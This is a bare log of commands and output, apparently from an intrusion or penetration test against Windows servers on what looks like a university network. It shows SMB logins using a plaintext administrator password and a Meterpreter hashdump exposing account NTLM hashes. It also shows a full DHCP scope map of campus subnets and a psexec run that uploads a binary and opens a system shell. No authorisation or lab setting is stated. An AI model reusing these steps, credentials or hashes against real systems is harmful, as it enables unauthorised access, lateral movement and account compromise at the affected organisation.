
```
10.1.205.15
windows
```

```
smbclient -L 10.1.205.21 -U Administrador%n3w-pr0y3ct-2015
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        IPC$            IPC       IPC remota
        VBRCatalog      Disk
SMB1 disabled -- no workgroup available
```

```
smbclient -L 10.1.205.15 -U Administrador%n3w-pr0y3ct-2015
smbclient \\\\10.1.205.15\\d$ -U Administrador%n3w-pr0y3ct-2015
```

```
meterpreter > sysinfo
Computer        : SRVUAZ-DHCP1
OS              : Windows 2012 (6.2 Build 9200).
Architecture    : x64
System Language : es_MX
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter >
```

```
meterpreter > hashdump
Administrador:500:aad3b435b51404eeaad3b435b51404ee:121175bea3b977e402781747a261a34e:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
secadm:1004:aad3b435b51404eeaad3b435b51404ee:438454d5aa0d6609fea7b7d09891f9a6:::
```

```
netsh
netsh>dhcp
netsh dhcp>server
netsh dhcp server>show

```

```
netsh dhcp server>show scope

==============================================================================
 Direccin del mbito - Mscara subred - Estado - Nombre del mbito - Comentario
==============================================================================


 10.1.4.0       - 255.255.255.0  -Activo        -SPAUAZ               -Pool Vlan 4 SP
 10.1.5.0       - 255.255.255.0  -Activo        -CAMARAS-SEGURIDAD    -Pool de direcc
 10.1.6.0       - 255.255.255.0  -Activo        -INVERSORES           -APs Ubiquiti I
 10.1.7.0       - 255.255.255.0  -Activo        -SRyT                 -Pool General S
 10.1.8.0       - 255.255.255.0  -Activo        -DSE                  -DSE-CABLEADO
 10.1.9.0       - 255.255.255.0  -Activo        -PROYECTOS-FEDERALES  -PROYECTOS-FEDE
 10.1.10.0      - 255.255.255.0  -Activo        -CLINICA-UNI-DOC      -CLINICA-UNI-DO
 10.1.11.0      - 255.255.255.0  -Activo        -CLINICA-UNI-CAB      -CLINICA-UNI-CA
 10.1.12.0      - 255.255.255.0  -Activo        -STUAZ-CAB            -STUAZ-CABLEADO
 10.1.13.0      - 255.255.255.0  -Activo        -STUAZ-DOC            -STUAZ-DOCENTES
 10.1.14.0      - 255.255.255.0  -Activo        -TV-UAZ               -TV-UAZ-DOCENTE
 10.1.15.0      - 255.255.255.0  -Activo        -ESVAIN               -ESVAIN
 10.1.16.0      - 255.255.255.0  -Activo        -WLC-UBQ-SRyT         -Pool 16 Ubiqui
 10.1.17.0      - 255.255.255.0  -Activo        -WLC-UBQ-POSGRADOS-FCA-Pool 17 Contro
 10.1.19.0      - 255.255.255.0  -Activo        -CIVIL-CC-CAB         -CIVIL-CC-CAB
 10.1.20.0      - 255.255.252.0  -Activo        -CULTURA-ALU          -CULTURA-ALUMNO
 10.1.24.0      - 255.255.255.0  -Activo        -CULTURA-CAB          -CULTURA-CABLEA
 10.1.25.0      - 255.255.255.0  -Activo        -CULTURA-DOC          -CULTURA-DOCENT
 10.1.26.0      - 255.255.255.0  -Activo        -CIVIL-DOC            -Docentes Civil
 10.1.27.0      - 255.255.255.0  -Activo        -CIVIL-CAB            -Cableado Civil
 10.1.28.0      - 255.255.252.0  -Activo        -CIVIL-ALU            -ALUMNOS CIVIL
 10.1.32.0      - 255.255.252.0  -Activo        -ARQUI-ALU            -Alumnos arquit
 10.1.36.0      - 255.255.255.0  -Activo        -ARQUI-CAB            -cableado arqui
 10.1.37.0      - 255.255.255.0  -Activo        -ARQUI-DOC            -Docentes arqui
 10.1.38.0      - 255.255.255.0  -Activo        -TOPO-DOC             -Topografia-Doc
 10.1.39.0      - 255.255.255.0  -Activo        -TOPO-CAB             -Pool Topografi
 10.1.40.0      - 255.255.252.0  -Activo        -TOPO-ALU             -Pool Topografi
 10.1.44.0      - 255.255.252.0  -Activo        -HIDRAULICA-ALU       -HIDRAULICA-ALU
 10.1.48.0      - 255.255.255.0  -Activo        -HIDRAULICA-CAB       -HIDRAULICA-CAB
 10.1.51.0      - 255.255.255.0  -Activo        -HIDRAULICA-DOC       -HIDRAULICA-DOC
 10.1.52.0      - 255.255.252.0  -Activo        -UAI-ALU              -UAI-ALU
 10.1.56.0      - 255.255.255.0  -Activo        -UAI-CAB              -UAI-CAB
 10.1.57.0      - 255.255.255.0  -Activo        -UAI-DOC              -UAI-DOC
 10.1.58.0      - 255.255.255.0  -Activo        -MECANICA-DOC         -Docentes Mecan
 10.1.59.0      - 255.255.255.0  -Activo        -MECANICA-CAB         -cableado Mecan
 10.1.60.0      - 255.255.252.0  -Activo        -MECANICA-ALU         -Alumnos mecani
 10.1.64.0      - 255.255.252.0  -Activo        -ING-ALU              -Pool ING-Alumn
 10.1.68.0      - 255.255.255.0  -Activo        -ING-CAB              -Pool ING-CAB
 10.1.69.0      - 255.255.255.0  -Activo        -ING-DOC              -Pool ING- Doce
 10.1.70.0      - 255.255.255.0  -Activo        -ROBOTICA-DOC         -ROBOTICA-DOC
 10.1.71.0      - 255.255.255.0  -Activo        -ROBOTICA-CAB         -ROBOTICA-CAB
 10.1.72.0      - 255.255.252.0  -Activo        -ROBOTICA-ALU         -ROBOTICA-ALU
 10.1.76.0      - 255.255.252.0  -Activo        -DERECHO-ALU          -DERECHO-ALU
 10.1.80.0      - 255.255.255.0  -Activo        -DERECHO-CAB          -DERECHO-CAB
 10.1.81.0      - 255.255.255.0  -Activo        -DERECHO-DOC          -DERECHO-DOC
 10.1.82.0      - 255.255.255.0  -Activo        -FCA-DOC              -Pool direccion
 10.1.83.0      - 255.255.255.0  -Activo        -FCA-CAB              -cableado
 10.1.84.0      - 255.255.252.0  -Activo        -FCA-ALU              -ALUMNOS FCA
 10.1.88.0      - 255.255.252.0  -Activo        -PSICOLOGIA-ALU       -PSICOLOGIA-ALU
 10.1.92.0      - 255.255.255.0  -Activo        -PSICOLOGIA-CAB       -PSICOLOGIA-CAB
 10.1.93.0      - 255.255.255.0  -Activo        -PSICOLOGIA-DOC       -PSICOLOGIA-DOC
 10.1.96.0      - 255.255.252.0  -Activo        -HUMANIDADES-ALU      -alumnos letras
 10.1.100.0     - 255.255.255.0  -Activo        -HUMANIDADES-CAB      -HUMANIDADES-CA
 10.1.101.0     - 255.255.255.0  -Activo        -HUMANIDADES-DOC      -HUMANIDADES-DO
 10.1.102.0     - 255.255.255.0  -Activo        -ARTES-DOC            -Pool artes doc
 10.1.103.0     - 255.255.255.0  -Activo        -ARTES-CAB            -Pool artes cab
 10.1.104.0     - 255.255.252.0  -Activo        -ARTES-ALU            -Pool Artes alu
 10.1.108.0     - 255.255.252.0  -Activo        -CBC-ALU              -CBC-ALU
 10.1.112.0     - 255.255.255.0  -Activo        -CBC-CAB              -CBC-CAB
 10.1.113.0     - 255.255.255.0  -Activo        -CBC-DOC              -CBC-DOC
 10.1.114.0     - 255.255.255.0  -Activo        -SOCIALES-DOC         -docentes socia
 10.1.115.0     - 255.255.255.0  -Activo        -SOCIALES-CAB         -pool vlan 115
 10.1.116.0     - 255.255.252.0  -Activo        -SOCIALES-ALU         -Alumnos, socia
 10.1.120.0     - 255.255.252.0  -Activo        -DOCENCIA-ALU         -DOCENCIA-ALU
 10.1.124.0     - 255.255.255.0  -Activo        -DOCENCIA-CAB         -DOCENCIA-CAB
 10.1.125.0     - 255.255.255.0  -Activo        -DOCENCIA-DOC         -DOCENCIA-DOC
 10.1.126.0     - 255.255.255.0  -Activo        -BIOLOGIA-DOC         -BIOLOGIA-DOC
 10.1.127.0     - 255.255.255.0  -Activo        -BIOLOGIA-CAB         -BIOLOGIA-CAB
 10.1.128.0     - 255.255.252.0  -Activo        -BIOLOGIA-ALU         -BIOLOGIA-ALU
 10.1.132.0     - 255.255.252.0  -Activo        -UAED-ALU             -UAED-ALU
 10.1.136.0     - 255.255.255.0  -Activo        -UAED-CAB             -UAED-CAB
 10.1.137.0     - 255.255.255.0  -Activo        -UAED-DOC             -UAED-DOC
 10.1.138.0     - 255.255.255.0  -Activo        -UAEN-DOC             -Pool UAEN-Doce
 10.1.139.0     - 255.255.255.0  -Activo        -UAEN-CAB             -Pool UAEN-Cabl
 10.1.140.0     - 255.255.252.0  -Activo        -UAEN-ALU             -Pool UAEN-Alum
 10.1.144.0     - 255.255.252.0  -Activo        -MATE-ALU             -MATEMATICAS AL
 10.1.148.0     - 255.255.255.0  -Activo        -MATE-CAB             -MATEMATICAS CA
 10.1.149.0     - 255.255.255.0  -Activo        -MATE-DOC             -MATEMATICAS DO
 10.1.156.0     - 255.255.252.0  -Activo        -SECUNDARIA-ALU       -SECUNDARIA-ALU
 10.1.160.0     - 255.255.255.0  -Activo        -SECUNDARIA-CAB       -SECUNDARIA-CAB
 10.1.161.0     - 255.255.255.0  -Activo        -SECUNDARIA-DOC       -SECUNDARIA-DOC
 10.1.162.0     - 255.255.255.0  -Activo        -ECONOMIA-DOC         -ECONOMIA-DOC
 10.1.163.0     - 255.255.255.0  -Activo        -ECONOMIA-CAB         -ECONOMIA-CAB
 10.1.164.0     - 255.255.252.0  -Activo        -ECONOMIA-ALU         -ECONOMIA-ALU
 10.1.168.0     - 255.255.252.0  -Activo        -CDT-ALU              -ALUMNOS CIENCI
 10.1.172.0     - 255.255.255.0  -Activo        -CDT-CAB              -CABLEADO CIENC
 10.1.173.0     - 255.255.255.0  -Activo        -CDT-DOC              -DOCENTES CIENC
 10.1.174.0     - 255.255.255.0  -Activo        -ODONTO-DOC           -ODONTO-DOC
 10.1.175.0     - 255.255.255.0  -Activo        -ODONTO-CAB           -ODONTO-CAB
 10.1.176.0     - 255.255.252.0  -Activo        -ODONTO-ALU           -ODONTO-ALU
 10.1.180.0     - 255.255.252.0  -Activo        -EXT-PREPAII - ALUMNOS-Poll Alumnos E
 10.1.184.0     - 255.255.255.0  -Activo        -EXT-PREPAII - CABLEAD-Pool Ext. Prep
 10.1.185.0     - 255.255.255.0  -Activo        -EXT-PREPAII - DOCENTE-Pool Ext- Prep
 10.1.192.0     - 255.255.252.0  -Activo        -TEMPORAL-2-ALUMNOS   -TEMPORAL-2-ALU
 10.1.196.0     - 255.255.255.0  -Activo        -TEMPORAL-2-CABLEADO  -TEMPORAL-2-CAB
 10.1.197.0     - 255.255.255.0  -Activo        -TEMPORAL-2-DOCENTES  -TEMPORAL-2-DOC
 10.1.198.0     - 255.255.255.0  -Activo        -TEMPORAL-3-DOCENTES  -TEMPORAL-3-DOC
 10.1.200.0     - 255.255.255.0  -Activo        -Wireless-CIT         -Pool Aps
 10.1.220.0     - 255.255.255.0  -Activo        -Rectoria             -Pool Rectoria
 10.1.224.0     - 255.255.248.0  -Activo        -DOCENTES - UAZ       -Pool de Docent
 10.1.240.0     - 255.255.255.0  -Activo        -Telefonia            -pool Telefonia
```

```
netsh dhcp server>show superscope

Supermbito    : (null)
        10.1.4.0  SPAUAZ
        10.1.5.0  CAMARAS-SEGURIDAD
        10.1.6.0  INVERSORES
        10.1.7.0  SRyT
        10.1.8.0  DSE
        10.1.9.0  PROYECTOS-FEDERALES
        10.1.10.0  CLINICA-UNI-DOC
        10.1.11.0  CLINICA-UNI-CAB
        10.1.12.0  STUAZ-CAB
        10.1.13.0  STUAZ-DOC
        10.1.14.0  TV-UAZ
        10.1.15.0  ESVAIN
        10.1.16.0  WLC-UBQ-SRyT
        10.1.17.0  WLC-UBQ-POSGRADOS-FCA
        10.1.19.0  CIVIL-CC-CAB
        10.1.20.0  CULTURA-ALU
        10.1.24.0  CULTURA-CAB
        10.1.25.0  CULTURA-DOC
        10.1.26.0  CIVIL-DOC
        10.1.27.0  CIVIL-CAB
        10.1.28.0  CIVIL-ALU
        10.1.32.0  ARQUI-ALU
        10.1.36.0  ARQUI-CAB
        10.1.37.0  ARQUI-DOC
        10.1.38.0  TOPO-DOC
        10.1.39.0  TOPO-CAB
        10.1.40.0  TOPO-ALU
        10.1.44.0  HIDRAULICA-ALU
        10.1.48.0  HIDRAULICA-CAB
        10.1.51.0  HIDRAULICA-DOC
        10.1.52.0  UAI-ALU
        10.1.56.0  UAI-CAB
        10.1.57.0  UAI-DOC
        10.1.58.0  MECANICA-DOC
        10.1.59.0  MECANICA-CAB
        10.1.60.0  MECANICA-ALU
        10.1.64.0  ING-ALU
        10.1.68.0  ING-CAB
        10.1.69.0  ING-DOC
        10.1.70.0  ROBOTICA-DOC
        10.1.71.0  ROBOTICA-CAB
        10.1.72.0  ROBOTICA-ALU
        10.1.76.0  DERECHO-ALU
        10.1.80.0  DERECHO-CAB
        10.1.81.0  DERECHO-DOC
        10.1.82.0  FCA-DOC
        10.1.83.0  FCA-CAB
        10.1.84.0  FCA-ALU
        10.1.88.0  PSICOLOGIA-ALU
        10.1.92.0  PSICOLOGIA-CAB
        10.1.93.0  PSICOLOGIA-DOC
        10.1.96.0  HUMANIDADES-ALU
        10.1.100.0  HUMANIDADES-CAB
        10.1.101.0  HUMANIDADES-DOC
        10.1.102.0  ARTES-DOC
        10.1.103.0  ARTES-CAB
        10.1.104.0  ARTES-ALU
        10.1.108.0  CBC-ALU
        10.1.112.0  CBC-CAB
        10.1.113.0  CBC-DOC
        10.1.114.0  SOCIALES-DOC
        10.1.115.0  SOCIALES-CAB
        10.1.116.0  SOCIALES-ALU
        10.1.120.0  DOCENCIA-ALU
        10.1.124.0  DOCENCIA-CAB
        10.1.125.0  DOCENCIA-DOC
        10.1.126.0  BIOLOGIA-DOC
        10.1.127.0  BIOLOGIA-CAB
        10.1.128.0  BIOLOGIA-ALU
        10.1.132.0  UAED-ALU
        10.1.136.0  UAED-CAB
        10.1.137.0  UAED-DOC
        10.1.138.0  UAEN-DOC
        10.1.139.0  UAEN-CAB
        10.1.140.0  UAEN-ALU
        10.1.144.0  MATE-ALU
        10.1.148.0  MATE-CAB
        10.1.149.0  MATE-DOC
        10.1.156.0  SECUNDARIA-ALU
        10.1.160.0  SECUNDARIA-CAB
        10.1.161.0  SECUNDARIA-DOC
        10.1.162.0  ECONOMIA-DOC
        10.1.163.0  ECONOMIA-CAB
        10.1.164.0  ECONOMIA-ALU
        10.1.168.0  CDT-ALU
        10.1.172.0  CDT-CAB
        10.1.173.0  CDT-DOC
        10.1.174.0  ODONTO-DOC
        10.1.175.0  ODONTO-CAB
        10.1.176.0  ODONTO-ALU
        10.1.180.0  EXT-PREPAII - ALUMNOS
        10.1.184.0  EXT-PREPAII - CABLEADO
        10.1.185.0  EXT-PREPAII - DOCENTES
        10.1.192.0  TEMPORAL-2-ALUMNOS
        10.1.196.0  TEMPORAL-2-CABLEADO
        10.1.197.0  TEMPORAL-2-DOCENTES
        10.1.198.0  TEMPORAL-3-DOCENTES
        10.1.200.0  Wireless-CIT
        10.1.220.0  Rectoria
        10.1.224.0  DOCENTES - UAZ
        10.1.240.0  Telefonia
```


```
python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrador:n3w-pr0y3ct-2015@10.1.205.15
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.1.205.15.....
[*] Found writable share ADMIN$
[*] Uploading file zDGccgSc.exe
[*] Opening SVCManager on 10.1.205.15.....
[*] Creating service lWnW on 10.1.205.15.....
[*] Starting service lWnW.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 6.2.9200]

(c) 2012 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> 

```